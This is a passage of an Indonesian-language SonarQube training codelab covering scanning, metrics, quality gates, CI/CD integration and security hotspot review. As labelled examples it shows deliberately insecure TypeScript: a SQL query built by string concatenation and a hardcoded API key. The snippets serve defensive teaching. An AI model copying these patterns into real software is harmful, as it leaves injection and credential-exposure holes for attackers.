+<aside class="warning"><p><strong>Security Review E</strong> terlihat mengkhawatirkan, tapi artinya Anda <strong>belum mereview</strong> Security Hotspot yang ada — bukan berarti semuanya berbahaya. Kita akan melakukan review ini di <strong>Modul 8</strong>.</p>
+</aside>
+<h2 is-upgraded>Multi-Language Support</h2>
+<p>SonarQube mendukung 30+ bahasa pemrograman:</p>
+<table>
+<tr><td colspan="1" rowspan="1"><p>Bahasa</p>
+</td><td colspan="1" rowspan="1"><p>Plugin</p>
+</td><td colspan="1" rowspan="1"><p>Community Edition</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p>TypeScript/JavaScript</p>
+</td><td colspan="1" rowspan="1"><p>Built-in</p>
+</td><td colspan="1" rowspan="1"><p>✅</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p>Java</p>
+</td><td colspan="1" rowspan="1"><p>Built-in</p>
+</td><td colspan="1" rowspan="1"><p>✅</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p>Python</p>
+</td><td colspan="1" rowspan="1"><p>Built-in</p>
+</td><td colspan="1" rowspan="1"><p>✅</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p>PHP</p>
+</td><td colspan="1" rowspan="1"><p>Built-in</p>
+</td><td colspan="1" rowspan="1"><p>✅</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p>C#</p>
+</td><td colspan="1" rowspan="1"><p>Built-in</p>
+</td><td colspan="1" rowspan="1"><p>✅</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p>Go</p>
+</td><td colspan="1" rowspan="1"><p>Built-in</p>
+</td><td colspan="1" rowspan="1"><p>✅</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p>Kotlin</p>
+</td><td colspan="1" rowspan="1"><p>Built-in</p>
+</td><td colspan="1" rowspan="1"><p>✅</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p>C/C++</p>
+</td><td colspan="1" rowspan="1"><p>SonarCFamily</p>
+</td><td colspan="1" rowspan="1"><p>❌ (Commercial)</p>
+</td></tr>
+</table>
+<h2 is-upgraded>Branch Analysis</h2>
+<pre><code language="language-bash" class="language-bash"># Scan branch tertentu
+npx sonar-scanner \
+  -Dsonar.branch.name=feature/new-login
+</code></pre>
+<h2 is-upgraded>Pull Request Analysis</h2>
+<pre><code language="language-bash" class="language-bash"># Scan PR
+npx sonar-scanner \
+  -Dsonar.pullrequest.key=42 \
+  -Dsonar.pullrequest.branch=feature/new-login \
+  -Dsonar.pullrequest.base=main
+</code></pre>
+<aside class="warning"><p> Branch analysis dan PR analysis pada Community Edition terbatas. Untuk fitur lengkap, dibutuhkan Developer Edition atau lebih.</p>
+</aside>
+<h2 is-upgraded>✅ Hands-on: Scan Project Anda</h2>
+<ol type="1">
+<li>Clone sample project</li>
+<li>Buat project di SonarQube</li>
+<li>Buat <code>sonar-project.properties</code></li>
+<li>Jalankan <code>npx sonar-scanner</code></li>
+<li>Buka dashboard dan catat temuan Anda</li>
+</ol>
+<p><strong>Pertanyaan diskusi:</strong></p>
+<ul>
+<li>Apa issue paling kritis yang ditemukan?</li>
+<li>Apakah ada false positive?</li>
+<li>Issue mana yang paling mudah dan paling sulit di-fix?</li>
+</ul>
+<aside class="special"><p><strong>Contoh temuan:</strong> SQL Injection (Blocker), hardcoded password (Hotspot), <code>any</code> type &amp; <code>console.log</code> (Code Smell). Paling mudah di-fix: <code>any</code> type. Paling sulit: SQL Injection (perlu parameterized query).</p>
+</aside>
+
+
+      </google-codelab-step>
+    
+      <google-codelab-step label="Modul 5 - Memahami Metrik &amp; Dashboard" duration="15">
+        <h2 is-upgraded>Overview Metrik SonarQube</h2>
+<p>SonarQube mengelompokkan issue ke dalam 3 kategori utama:</p>
+<h2 is-upgraded>🐛 Bugs</h2>
+<p><strong>Definisi:</strong> Kode yang salah secara logika dan berpotensi menyebabkan error saat runtime.</p>
+<p><strong>Contoh:</strong></p>
+<pre><code language="language-typescript" class="language-typescript">// Bug: kondisi selalu false
+function checkAge(age: number) {
+  if (age !== age) {  // NaN check yang salah
+    return &#34;invalid&#34;;
+  }
+}
+
+// Bug: null dereference
+function getLength(str: string | null) {
+  return str.length;  // bisa null!
+}
+</code></pre>
+<p><strong>Reliability Rating:</strong></p>
+<table>
+<tr><td colspan="1" rowspan="1"><p>Rating</p>
+</td><td colspan="1" rowspan="1"><p>Arti</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>A</strong></p>
+</td><td colspan="1" rowspan="1"><p>0 bugs</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>B</strong></p>
+</td><td colspan="1" rowspan="1"><p>≥ 1 minor bug</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>C</strong></p>
+</td><td colspan="1" rowspan="1"><p>≥ 1 major bug</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>D</strong></p>
+</td><td colspan="1" rowspan="1"><p>≥ 1 critical bug</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>E</strong></p>
+</td><td colspan="1" rowspan="1"><p>≥ 1 blocker bug</p>
+</td></tr>
+</table>
+<p><strong>Contoh tampilan Issues tab - Bug:</strong></p>
+<p class="image-container"><img alt="Issues Tab Bugs" src="img\\de896d3d591ac1f1.png"></p>
+<p>Dari screenshot di atas, project sample kita memiliki <strong>4 Bugs</strong>, semuanya severity <strong>Major</strong>:</p>
+<table>
+<tr><td colspan="1" rowspan="1"><p>Issue</p>
+</td><td colspan="1" rowspan="1"><p>File</p>
+</td><td colspan="1" rowspan="1"><p>Lokasi</p>
+</td><td colspan="1" rowspan="1"><p>Effort</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p>Unreachable code.</p>
+</td><td colspan="1" rowspan="1"><p><code>userService.ts</code></p>
+</td><td colspan="1" rowspan="1"><p>L96</p>
+</td><td colspan="1" rowspan="1"><p>5 min</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p>Unreachable code.</p>
+</td><td colspan="1" rowspan="1"><p><code>userService.ts</code></p>
+</td><td colspan="1" rowspan="1"><p>L103</p>
+</td><td colspan="1" rowspan="1"><p>5 min</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p>Remove this conditional structure (identical blocks)</p>
+</td><td colspan="1" rowspan="1"><p><code>helpers.ts</code></p>
+</td><td colspan="1" rowspan="1"><p>L21</p>
+</td><td colspan="1" rowspan="1"><p>15 min</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p>‘result&#39; is assigned to itself.</p>
+</td><td colspan="1" rowspan="1"><p><code>helpers.ts</code></p>
+</td><td colspan="1" rowspan="1"><p>L62</p>
+</td><td colspan="1" rowspan="1"><p>3 min</p>
+</td></tr>
+</table>
+<p>Total estimasi waktu perbaikan: <strong>28 menit</strong>. Klik salah satu issue untuk melihat lokasi kode dan rekomendasi fix dari SonarQube.</p>
+<h2 is-upgraded>🔓 Vulnerabilities</h2>
+<p><strong>Definisi:</strong> Kode yang memiliki celah keamanan yang bisa dieksploitasi.</p>
+<p><strong>Contoh:</strong></p>
+<pre><code language="language-typescript" class="language-typescript">// Vulnerability: SQL Injection
+const query = &#34;SELECT * FROM users WHERE id = &#34; + userId;
+
+// Vulnerability: Hardcoded credential
+const API_KEY = &#34;sk-1234567890abcdef&#34;;
+</code></pre>
+<p><strong>Security Rating:</strong></p>
+<table>
+<tr><td colspan="1" rowspan="1"><p>Rating</p>
+</td><td colspan="1" rowspan="1"><p>Arti</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>A</strong></p>
+</td><td colspan="1" rowspan="1"><p>0 vulnerabilities</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>B</strong></p>
+</td><td colspan="1" rowspan="1"><p>≥ 1 minor vulnerability</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>C</strong></p>
+</td><td colspan="1" rowspan="1"><p>≥ 1 major vulnerability</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>D</strong></p>
+</td><td colspan="1" rowspan="1"><p>≥ 1 critical vulnerability</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>E</strong></p>
+</td><td colspan="1" rowspan="1"><p>≥ 1 blocker vulnerability</p>
+</td></tr>
+</table>
+<p><strong>Contoh tampilan Issues tab - Vulnerability:</strong></p>
+<p class="image-container"><img alt="Issues Tab Vulnerabilities" src="img\\c6c347ba032b0969.png"></p>
+<p>Project sample kita memiliki <strong>0 Vulnerabilities</strong> — tidak ada celah keamanan yang terdeteksi secara otomatis. Security Rating = <strong>A</strong>.</p>
+<aside class="special"><p> Tidak ada vulnerability bukan berarti kode 100% aman. SonarQube hanya mendeteksi pola yang sudah dikenal. Bagian yang perlu review manual ada di tab <strong>Security Hotspots</strong> yang kita bahas di Modul 8.</p>
+</aside>
+<h2 is-upgraded>😤 Code Smells</h2>
+<p><strong>Definisi:</strong> Kode yang berfungsi, tapi sulit dipahami dan di-maintain.</p>
+<p><strong>Contoh:</strong></p>
+<pre><code language="language-typescript" class="language-typescript">// Code Smell: function terlalu panjang (&gt;30 baris)
+// Code Smell: cognitive complexity terlalu tinggi
+// Code Smell: parameter terlalu banyak
+function processOrder(
+  userId: any, orderId: any, items: any, 
+  discount: any, tax: any, shipping: any,
+  coupon: any, address: any
+) {
+  // ... 200 baris kode ...
+}
+
+// Code Smell: unused variable
+const unusedVar = &#34;never used&#34;;
+
+// Code Smell: console.log in production
+console.log(&#34;debug: user data&#34;, userData);
+</code></pre>
+<p><strong>Maintainability Rating:</strong></p>
+<table>
+<tr><td colspan="1" rowspan="1"><p>Rating</p>
+</td><td colspan="1" rowspan="1"><p>Debt Ratio</p>
+</td><td colspan="1" rowspan="1"><p>Arti</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>A</strong></p>
+</td><td colspan="1" rowspan="1"><p>≤ 5%</p>
+</td><td colspan="1" rowspan="1"><p>Sangat baik</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>B</strong></p>
+</td><td colspan="1" rowspan="1"><p>6-10%</p>
+</td><td colspan="1" rowspan="1"><p>Baik</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>C</strong></p>
+</td><td colspan="1" rowspan="1"><p>11-20%</p>
+</td><td colspan="1" rowspan="1"><p>Cukup</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>D</strong></p>
+</td><td colspan="1" rowspan="1"><p>21-50%</p>
+</td><td colspan="1" rowspan="1"><p>Kurang</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>E</strong></p>
+</td><td colspan="1" rowspan="1"><p>&gt; 50%</p>
+</td><td colspan="1" rowspan="1"><p>Buruk</p>
+</td></tr>
+</table>
+<p><strong>Contoh tampilan Issues tab - Code Smell:</strong></p>
+<p class="image-container"><img alt="Issues Tab Code Smells" src="img\\3084c14f48f36a84.png"></p>
+<p>Project sample kita memiliki <strong>16 Code Smells</strong> dengan rincian severity:</p>
+<table>
+<tr><td colspan="1" rowspan="1"><p>Severity</p>
+</td><td colspan="1" rowspan="1"><p>Jumlah</p>
+</td><td colspan="1" rowspan="1"><p>Contoh</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>Critical</strong></p>
+</td><td colspan="1" rowspan="1"><p>3</p>
+</td><td colspan="1" rowspan="1"><p>Cognitive Complexity dari 77 → harus ≤ 15 (1h 7min per issue)</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>Major</strong></p>
+</td><td colspan="1" rowspan="1"><p>7</p>
+</td><td colspan="1" rowspan="1"><p>Terlalu banyak parameter (10 params, max 7), redundant assignment</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>Minor</strong></p>
+</td><td colspan="1" rowspan="1"><p>4</p>
+</td><td colspan="1" rowspan="1"><p>Unused import (<code>bcrypt</code>, <code>CONFIG</code>), duplicate import</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>Info</strong></p>
+</td><td colspan="1" rowspan="1"><p>2</p>
+</td><td colspan="1" rowspan="1"><p>Saran best practice</p>
+</td></tr>
+</table>
+<p>Total estimasi perbaikan: <strong>3 jam 40 menit</strong>. Meski banyak, Maintainability tetap <strong>A</strong> karena <em>debt ratio</em> masih rendah dibanding total ukuran kode.</p>
+<h2 is-upgraded>📊 Coverage</h2>
+<p><strong>Definisi:</strong> Persentase baris kode yang dijalankan oleh unit test.</p>
+<pre><code>Coverage = (Lines Covered by Tests / Total Lines) × 100%
+</code></pre>
+<p><strong>Best practice:</strong> Target <strong>80%+</strong> untuk new code.</p>
+<h2 is-upgraded>📋 Duplication</h2>
+<p><strong>Definisi:</strong> Persentase baris kode yang terduplikasi.</p>
+<p><strong>Best practice:</strong> Target <strong>&lt; 3%</strong> duplication.</p>
+<h2 is-upgraded>✅ Hands-on: Baca Dashboard Anda</h2>
+<p>Buka project yang sudah di-scan, jawab pertanyaan berikut:</p>
+<ol type="1">
+<li>Reliability Rating project Anda = ?</li>
+<li>Security Rating = ?</li>
+<li>Maintainability Rating = ?</li>
+<li>Berapa total bugs? Klik salah satu - apa deskripsi issue-nya?</li>
+<li>Berapa total vulnerabilities? Apa yang paling kritis?</li>
+<li>Berapa total code smells? Mana yang paling sering muncul?</li>
+<li>Code coverage = ? (Kemungkinan 0% karena belum ada test)</li>
+<li>Duplication = ?</li>
+</ol>
+<aside class="special"><p><strong>Perkiraan:</strong> Rating D-E untuk Reliability &amp; Security, C-D Maintainability. Bugs ~3-5, Vulnerabilities ~2-4, Code Smells ~10-20. Coverage 0% (belum ada test), Duplication 0-5%.</p>
+</aside>
+
+
+      </google-codelab-step>
+    
+      <google-codelab-step label="Modul 6 - Quality Gate &amp; Quality Profile" duration="15">
+        <h2 is-upgraded>Quality Gate: &#34;Lulus atau Tidak?&#34;</h2>
+<p>Quality Gate adalah <strong>kumpulan kondisi</strong> yang menentukan apakah project Anda <strong>PASS</strong> ✅ atau <strong>FAIL</strong> ❌.</p>
+<h2 is-upgraded>Default Quality Gate: &#34;Sonar Way&#34;</h2>
+<p>Kondisi default:</p>
+<table>
+<tr><td colspan="1" rowspan="1"><p>Metrik</p>
+</td><td colspan="1" rowspan="1"><p>Operator</p>
+</td><td colspan="1" rowspan="1"><p>Nilai</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p>Coverage on New Code</p>
+</td><td colspan="1" rowspan="1"><p>≥</p>
+</td><td colspan="1" rowspan="1"><p>80%</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p>Duplicated Lines on New Code</p>
+</td><td colspan="1" rowspan="1"><p>≤</p>
+</td><td colspan="1" rowspan="1"><p>3%</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p>Maintainability Rating on New Code</p>
+</td><td colspan="1" rowspan="1"><p>=</p>
+</td><td colspan="1" rowspan="1"><p>A</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p>Reliability Rating on New Code</p>
+</td><td colspan="1" rowspan="1"><p>=</p>
+</td><td colspan="1" rowspan="1"><p>A</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p>Security Rating on New Code</p>
+</td><td colspan="1" rowspan="1"><p>=</p>
+</td><td colspan="1" rowspan="1"><p>A</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p>Security Hotspots Reviewed on New Code</p>
+</td><td colspan="1" rowspan="1"><p>≥</p>
+</td><td colspan="1" rowspan="1"><p>100%</p>
+</td></tr>
+</table>
+<aside class="special"><p> Quality Gate &#34;Sonar Way&#34; berfokus pada <strong>new code</strong> - ini adalah pendekatan &#34;Clean as You Code&#34;. Kode lama tidak diblok, tapi kode baru harus bersih.</p>
+</aside>
+<h2 is-upgraded>Membuat Custom Quality Gate</h2>
+<ol type="1">
+<li>Buka <strong>Quality Gates</strong> di menu</li>
+<li>Klik <strong>Create</strong></li>
+<li>Beri nama: <code>Training Gate</code></li>
+<li>Tambahkan kondisi:</li>
+</ol>
+<p><strong>Contoh: Quality Gate untuk Tim Internal</strong></p>
+<table>
+<tr><td colspan="1" rowspan="1"><p>Metrik</p>
+</td><td colspan="1" rowspan="1"><p>Operator</p>
+</td><td colspan="1" rowspan="1"><p>Nilai</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p>Bugs on New Code</p>
+</td><td colspan="1" rowspan="1"><p>=</p>
+</td><td colspan="1" rowspan="1"><p>0</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p>Vulnerabilities on New Code</p>
+</td><td colspan="1" rowspan="1"><p>=</p>
+</td><td colspan="1" rowspan="1"><p>0</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p>Code Smells on New Code</p>
+</td><td colspan="1" rowspan="1"><p>≤</p>
+</td><td colspan="1" rowspan="1"><p>5</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p>Coverage on New Code</p>
+</td><td colspan="1" rowspan="1"><p>≥</p>
+</td><td colspan="1" rowspan="1"><p>60%</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p>Duplicated Lines on New Code</p>
+</td><td colspan="1" rowspan="1"><p>≤</p>
+</td><td colspan="1" rowspan="1"><p>5%</p>
+</td></tr>
+</table>
+<ol type="1" start="5">
+<li>Klik <strong>Set as Default</strong> (opsional)</li>
+</ol>
+<h2 is-upgraded>Quality Profile: &#34;Rules Apa yang Dipakai?&#34;</h2>
+<p>Quality Profile menentukan <strong>rules mana yang aktif</strong> saat scanning.</p>
+<ol type="1">
+<li>Buka <strong>Quality Profiles</strong> di menu</li>
+<li>Lihat profile default untuk TypeScript: <strong>Sonar Way</strong></li>
+<li>Klik profile → lihat daftar rules yang aktif</li>
+</ol>
+<h2 is-upgraded>Membuat Custom Quality Profile</h2>
+<ol type="1">
+<li>Buka <strong>Quality Profiles</strong></li>
+<li>Klik <strong>Create</strong> pada bahasa TypeScript</li>
+<li>Pilih <strong>Inherit from Sonar Way</strong> (recommended)</li>
+<li>Anda bisa: <ul>
+<li><strong>Activate</strong> rules tambahan</li>
+<li><strong>Deactivate</strong> rules yang tidak relevan</li>
+<li><strong>Ubah severity</strong> rule</li>
+</ul>
+</li>
+</ol>
+<p><strong>Contoh use case:</strong></p>
+<ul>
+<li>Nonaktifkan rule tentang JSDoc jika tim tidak mewajibkannya</li>
+<li>Tambahkan rule custom tentang naming convention</li>
+</ul>
+<h2 is-upgraded>✅ Hands-on: Custom Quality Gate</h2>
+<ol type="1">
+<li>Buat Quality Gate baru bernama <code>[NAMA]-Gate</code></li>
+<li>Tambahkan minimal 3 kondisi</li>
+<li>Assign ke project Anda</li>
+<li>Scan ulang project → apakah PASS atau FAIL?</li>
+<li>Coba ubah threshold agar project PASS</li>
+<li>Kembalikan threshold yang ketat - ini akan berguna di modul selanjutnya</li>
+</ol>
+
+
+      </google-codelab-step>
+    
+      <google-codelab-step label="Modul 7 - Integrasi SonarQube dengan CI/CD" duration="25">
+        <h2 is-upgraded>Mengapa CI/CD + SonarQube?</h2>
+<pre><code>Manual Scan:     Developer ingat → scan → lihat hasil → (mungkin) fix
+CI/CD + Sonar:   Push code → otomatis scan → block merge jika gagal
+</code></pre>
+<p><strong>CI/CD + SonarQube = Quality enforcement otomatis!</strong></p>
+<h2 is-upgraded>Arsitektur CI/CD + SonarQube</h2>
+<p class="image-container"><img alt="CI/CD + SonarQube Flow" src="img\\9c8ecc534a282f34.png"></p>
+<h2 is-upgraded>Setup GitHub Actions + SonarQube</h2>
+<h3 is-upgraded>Step 1: Generate Token di SonarQube</h3>
+<ol type="1">
+<li>Buka SonarQube → <strong>My Account</strong> → <strong>Security</strong></li>
+<li>Generate token → copy</li>
+</ol>
+<h3 is-upgraded>Step 2: Tambah GitHub Secrets</h3>
+<p>Di repo GitHub → <strong>Settings</strong> → <strong>Secrets and variables</strong> → <strong>Actions</strong>:</p>
+<table>
+<tr><td colspan="1" rowspan="1"><p>Secret Name</p>
+</td><td colspan="1" rowspan="1"><p>Value</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><code>SONAR_TOKEN</code></p>
+</td><td colspan="1" rowspan="1"><p>Token dari Step 1</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><code>SONAR_HOST_URL</code></p>
+</td><td colspan="1" rowspan="1"><p><code>http://sonar-training.duckdns.org</code></p>
+</td></tr>
+</table>
+<h3 is-upgraded>Step 3: Buat Workflow File</h3>
+<p>Buat <code>.github/workflows/sonarqube.yml</code>:</p>
+<pre><code language="language-yaml" class="language-yaml">name: SonarQube Analysis
+
+on:
+  push:
+    branches: [ main ]
+  pull_request:
+    branches: [ main ]
+
+jobs:
+  sonarqube:
+    name: SonarQube Scan
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 0  # Full history for better analysis
+
+      - name: Setup Node.js
+        uses: actions/setup-node@v4
+        with:
+          node-version: &#39;20&#39;
+
+      - name: Install dependencies
+        run: npm ci
+
+      - name: Run tests with coverage
+        run: npm test -- --coverage
+        continue-on-error: true
+
+      - name: SonarQube Scan
+        uses: SonarSource/sonarqube-scan-action@v3
+        env:
+          SONAR_TOKEN: $&#123;&#123; secrets.SONAR_TOKEN }}
+          SONAR_HOST_URL: $&#123;&#123; secrets.SONAR_HOST_URL }}
+
+      - name: SonarQube Quality Gate
+        uses: SonarSource/sonarqube-quality-gate-action@v1
+        timeout-minutes: 5
+        env:
+          SONAR_TOKEN: $&#123;&#123; secrets.SONAR_TOKEN }}
+</code></pre>
+<h3 is-upgraded>Step 4: Push &amp; Lihat Pipeline</h3>
+<pre><code language="language-bash" class="language-bash">git add .
+git commit -m &#34;Add SonarQube CI/CD integration&#34;
+git push origin main
+</code></pre>
+<p>Buka tab <strong>Actions</strong> di GitHub → lihat workflow berjalan.</p>
+<h2 is-upgraded>Demo: Quality Gate Fail di Pipeline</h2>
+<pre><code language="language-bash" class="language-bash"># Buat branch dengan kode buggy
+git checkout -b feature/buggy-code
+
+# Tambahkan kode yang sengaja jelek
+# ... (tambah vulnerability, code smell, dll)
+
+git add .
+git commit -m &#34;Add buggy feature&#34;
+git push origin feature/buggy-code
+
+# Buat Pull Request di GitHub
+# → Lihat Quality Gate FAIL di PR checks!
+</code></pre>
+<h2 is-upgraded>PR Decoration</h2>
+<p>Jika quality gate gagal, GitHub akan menampilkan status check <strong>failed</strong> pada Pull Request. Ini mencegah merge kode yang tidak memenuhi standar.</p>
+<pre><code>PR #42: Add buggy feature
+────────────────────────────
+Checks:
+  ❌ SonarQube Quality Gate - Failed
+     2 new bugs, 1 new vulnerability
+     Coverage: 0% (&lt; 80% required)
+     
+  → Cannot merge until all checks pass
+</code></pre>
+<aside class="special"><p> Ini adalah inti dari <strong>DevSecOps</strong> - keamanan dan kualitas terintegrasi otomatis dalam development workflow.</p>
+</aside>
+<h2 is-upgraded>✅ Hands-on: Setup CI/CD</h2>
+<ol type="1">
+<li>Fork repo <code>sonarqube-training-cicd-demo</code></li>
+<li>Tambahkan GitHub Secrets (<code>SONAR_TOKEN</code>, <code>SONAR_HOST_URL</code>)</li>
+<li>Push ke main → lihat scan berjalan di Actions</li>
+<li>Buat branch baru → tambah kode buggy → buat PR</li>
+<li>Lihat Quality Gate status di PR</li>
+</ol>
+
+
+      </google-codelab-step>
+    
+      <google-codelab-step label="Modul 8 - Security Analysis &amp; Vulnerability Management" duration="15">
+        <h2 is-upgraded>SAST - Static Application Security Testing</h2>
+<p>SonarQube melakukan <strong>SAST</strong> - menganalisis source code tanpa menjalankannya.</p>
+<table>
+<tr><td colspan="1" rowspan="1"><p>Metode</p>
+</td><td colspan="1" rowspan="1"><p>Kapan</p>
+</td><td colspan="1" rowspan="1"><p>Apa yang dianalisis</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>SAST</strong> (SonarQube)</p>
+</td><td colspan="1" rowspan="1"><p>Saat development/CI</p>
+</td><td colspan="1" rowspan="1"><p>Source code</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>DAST</strong></p>
+</td><td colspan="1" rowspan="1"><p>Saat testing</p>
+</td><td colspan="1" rowspan="1"><p>Running application</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>SCA</strong></p>
+</td><td colspan="1" rowspan="1"><p>Saat build</p>
+</td><td colspan="1" rowspan="1"><p>Dependencies/library</p>
+</td></tr>
+</table>
+<h2 is-upgraded>Vulnerability vs Security Hotspot</h2>
+<table>
+<tr><td colspan="1" rowspan="1"></td><td colspan="1" rowspan="1"><p>Vulnerability</p>
+</td><td colspan="1" rowspan="1"><p>Security Hotspot</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>Apa</strong></p>
+</td><td colspan="1" rowspan="1"><p>Issue yang <strong>pasti</strong> berisiko</p>
+</td><td colspan="1" rowspan="1"><p>Issue yang <strong>mungkin</strong> berisiko</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>Aksi</strong></p>
+</td><td colspan="1" rowspan="1"><p>Harus di-fix</p>
+</td><td colspan="1" rowspan="1"><p>Perlu di-review</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>Contoh</strong></p>
+</td><td colspan="1" rowspan="1"><p>SQL Injection terdeteksi</p>
+</td><td colspan="1" rowspan="1"><p>Penggunaan crypto - apakah sudah benar?</p>
+</td></tr>
+</table>
+<h2 is-upgraded>Triage Workflow</h2>
+<p>Untuk <strong>Security Hotspot</strong>, Anda harus melakukan triage:</p>
+<p class="image-container"><img alt="Security Hotspot Triage" src="img\\6f019e6379b6d9e3.png"></p>
+<p>Status triage:</p>
+<ul>
+<li><strong>To Review</strong> - belum ditinjau</li>
+<li><strong>Acknowledged</strong> - sudah dilihat, akan ditangani nanti</li>
+<li><strong>Fixed</strong> - sudah diperbaiki</li>
+<li><strong>Safe</strong> - tidak berisiko setelah ditinjau (dismiss)</li>
+</ul>
+<h2 is-upgraded>Severity Classification</h2>
+<table>
+<tr><td colspan="1" rowspan="1"><p>Severity</p>
+</td><td colspan="1" rowspan="1"><p>Dampak</p>
+</td><td colspan="1" rowspan="1"><p>Contoh</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>Blocker</strong></p>
+</td><td colspan="1" rowspan="1"><p>Sistem crash / data breach</p>
+</td><td colspan="1" rowspan="1"><p>SQL Injection tanpa proteksi</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>Critical</strong></p>
+</td><td colspan="1" rowspan="1"><p>Risiko tinggi</p>
+</td><td colspan="1" rowspan="1"><p>Hardcoded credentials</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>Major</strong></p>
+</td><td colspan="1" rowspan="1"><p>Risiko medium</p>
+</td><td colspan="1" rowspan="1"><p>Weak encryption</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>Minor</strong></p>
+</td><td colspan="1" rowspan="1"><p>Risiko rendah</p>
+</td><td colspan="1" rowspan="1"><p>Verbose error message</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>Info</strong></p>
+</td><td colspan="1" rowspan="1"><p>Informasional</p>
+</td><td colspan="1" rowspan="1"><p>Best practice suggestion</p>
+</td></tr>
+</table>
+<h2 is-upgraded>OWASP Detection di SonarQube</h2>
+<p>SonarQube mendeteksi banyak OWASP Top 10 issues:</p>
+<table>
+<tr><td colspan="1" rowspan="1"><p>OWASP</p>
+</td><td colspan="1" rowspan="1"><p>Kategori</p>
+</td><td colspan="1" rowspan="1"><p>Deteksi SonarQube</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p>A01</p>
+</td><td colspan="1" rowspan="1"><p>Broken Access Control</p>
+</td><td colspan="1" rowspan="1"><p>✅ Beberapa rule</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p>A02</p>
+</td><td colspan="1" rowspan="1"><p>Cryptographic Failures</p>
+</td><td colspan="1" rowspan="1"><p>✅ Weak hash, weak cipher</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p>A03</p>
+</td><td colspan="1" rowspan="1"><p>Injection</p>
+</td><td colspan="1" rowspan="1"><p>✅ SQL, XSS, LDAP, Command injection</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p>A05</p>
+</td><td colspan="1" rowspan="1"><p>Security Misconfiguration</p>
+</td><td colspan="1" rowspan="1"><p>✅ CORS, debug settings</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p>A07</p>
+</td><td colspan="1" rowspan="1"><p>Auth Failures</p>
+</td><td colspan="1" rowspan="1"><p>✅ Hardcoded credentials</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p>A09</p>
+</td><td colspan="1" rowspan="1"><p>Logging Failures</p>
+</td><td colspan="1" rowspan="1"><p>✅ Sensitive data in logs</p>
+</td></tr>
+</table>
+<h2 is-upgraded>✅ Hands-on: Security Review</h2>
+<ol type="1">
+<li>Buka project Anda di SonarQube</li>
+<li>Navigasi ke tab <strong>Security Hotspots</strong></li>
+<li>Review setiap hotspot - pilih <strong>Safe</strong> atau <strong>Not Safe</strong></li>
+<li>Navigasi ke tab <strong>Vulnerabilities</strong></li>
+<li>Klik vulnerability → baca penjelasan dan rekomendasi fix</li>
+<li>Catat: berapa vulnerability yang ditemukan? Apa severity-nya?</li>
+</ol>
+
+
+      </google-codelab-step>
+    
+      <google-codelab-step label="Modul 9 - Best Practice Refactoring" duration="20">
+        <h2 is-upgraded>Strategi: Clean as You Code</h2>
+<p>Jangan coba fix semua issue sekaligus! Gunakan pendekatan <strong>incremental:</strong></p>
